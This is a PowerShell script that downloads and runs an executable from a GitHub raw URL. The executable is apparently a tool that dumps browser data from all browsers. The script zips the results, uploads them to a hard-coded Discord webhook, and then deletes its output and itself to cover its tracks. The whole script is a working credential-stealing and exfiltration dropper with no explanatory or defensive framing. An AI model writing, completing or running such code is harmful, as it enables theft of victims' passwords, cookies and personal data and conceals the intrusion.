$filePath = "Yor2.exe"
$apiUrl = "https://raw.githubusercontent.com/yorobsession/YorObsession/master/Yor2.exe"
$webhookUrl = "https://discord.com/api/webhooks/1195821964212830289/I-I2dZVEr2aoNVq4DlnTYPD4LYyTQk-67RnASO7EI0189E9w9ArIY2WehEAuX34igDRQ"
$folderName = "tempyor"
$filePath = "C:\$folderName\results"
$exePath = "C:\$folderName\Yor2.exe"
$zipPath = "$filePath\results.zip"

$ProgressPreference = 'SilentlyContinue'
$null = New-Item -Path "C:\" -Name $folderName -Force -ItemType "directory"
$null = Invoke-RestMethod -Uri $apiUrl -OutFile $exePath -Method Get
Start-Sleep -Seconds 2
& $exePath -b all -f json --dir $filePath 2>&1 | Out-Null
Start-Sleep -Seconds 10
$txtFiles = Get-ChildItem -Path $filePath -Filter "*.json"
$null = Compress-Archive -Path $txtFiles.FullName -DestinationPath $zipPath -Force

# Use .NET HttpClient to send multipart/form-data correctly
Add-Type -AssemblyName System.Net.Http
$httpClient = New-Object System.Net.Http.HttpClient
$multipartContent = New-Object System.Net.Http.MultipartFormDataContent

# Read the ZIP file as bytes and add to multipart content
$fileStream = [System.IO.File]::OpenRead($zipPath)
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
$multipartContent.Add($fileContent, "file", [System.IO.Path]::GetFileName($zipPath))

# Send the request
$null = $httpClient.PostAsync($webhookUrl, $multipartContent).Result

# Cleanup
$fileStream.Dispose()
$httpClient.Dispose()
$ProgressPreference = 'Continue'
$currentScriptPath = $MyInvocation.MyCommand.Path

Remove-Item -Path $txtFiles.FullName -Force
Remove-Item -Path $currentScriptPath -Force
Remove-Item "C:\$folderName" -Recurse